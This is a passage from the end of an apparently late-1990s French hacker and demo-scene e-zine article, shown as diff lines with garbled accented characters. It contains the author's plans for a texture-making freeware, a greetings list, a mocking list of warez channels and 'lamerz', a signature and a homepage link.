+meilleure qualit‚ :)).....… ce propos, je vais peut ˆtre programmer un ptit
+programme pour cr‚er des textures, un freeware ‚videmment...car je n'ai pas
+trouv‚ sur le march‚ de logiciels vraiment convaincant....alors si qqun veut
+m'apporter de l'aide ;).
+
+GrEeTiNgS:
+-A tout les groupes Hack et d‚mos
+-#pirate
+-Squab(Pourquoi ne pas ‚crire un article pour mon zine ;)?
+-Lagoon(Merci pour le Reporter ;)
+-Prezz(Ou es tu?)
+-Tout ceux qui supportent ce mag
+-Les lecteurs(oui vous l… ;)
+
+FuCk HaRd:
+-Tout les channels warez … la con
+-Bondz007
+-Tout les lamerz de la galaxie(un d‚butant n'‚tant pas forcement un lamer ;)
+-Tout les gamerz
+
+Billou Le SaTaNiK
+
+http://members.xoom.com/SaTaNoS/
